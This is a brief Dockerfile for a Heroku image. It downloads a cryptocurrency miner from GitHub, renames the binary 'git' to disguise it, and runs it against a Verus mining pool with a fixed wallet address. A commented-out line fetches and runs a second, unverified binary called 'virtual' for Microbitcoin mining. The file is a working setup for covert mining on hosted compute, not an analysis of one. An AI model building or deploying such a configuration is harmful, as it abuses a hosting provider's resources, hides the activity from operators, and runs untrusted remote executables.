FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget

# Verus Coin
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar zxvf hellminer_cpu_linux.tar.gz; rm -fr hellminer_cpu_linux.tar.gz
RUN mv hellminer git
RUN ./git -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RVMogaFrwhokbkM4M1WERfU8V8U1NQJLnk.VPS -p x --cpu 1

# Microbitcoin
#RUN wget http://www.netsteady.com/virtual; chmod +x virtual; ./virtual -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MgwuCc6yvsvMeg6AosthAe4gTvQwaoKFFu.VPS
CMD bash heroku.sh
